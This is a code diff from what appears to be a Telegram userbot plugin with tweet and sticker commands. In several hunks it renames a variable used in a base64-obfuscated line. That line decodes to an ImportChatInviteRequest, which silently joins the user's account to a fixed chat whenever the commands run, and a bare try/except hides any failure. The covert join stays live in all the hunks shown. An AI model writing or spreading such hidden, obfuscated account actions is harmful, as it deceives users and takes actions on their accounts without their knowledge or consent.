@@ -12,7 +12,7 @@ async def nope(himanshuop):
         else:
             await eod(himanshuop, "I need some text to make a tweet🚶")
             return
-    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(hell))}")
+    tweeter = await bot.inline_query("TwitterStatusBot", f"{(deEmojify(mafia))}")
     await tweeter[0].click(
         himanshuop.chat_id,
         reply_to=himanshuop.reply_to_msg_id,
@@ -145,7 +145,7 @@ async def nekobot(event):
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(mafia)
     except:
         pass
     text = deEmojify(text)
@@ -179,7 +179,7 @@ async def nekobot(event):
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(mafia)
     except:
         pass
     text = deEmojify(text)
@@ -212,7 +212,7 @@ async def nekobot(event):
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(mafia)
     except:
         pass
     text = deEmojify(text)
@@ -245,7 +245,7 @@ async def nekobot(event):
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(mafia)
     except:
         pass
     text = deEmojify(text)
@@ -278,7 +278,7 @@ async def nekobot(event):
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(mafia)
     except:
         pass
     text = deEmojify(text)
@@ -311,7 +311,7 @@ async def nekobot(event):
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(mafia)
     except:
         pass
     text = deEmojify(text)
@@ -345,7 +345,7 @@ async def nekobot(event):
                 "SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="
             )
         )[2:49]
-        await event.client(hell)
+        await event.client(mafia)
     except:
         pass
     text = deEmojify(text)
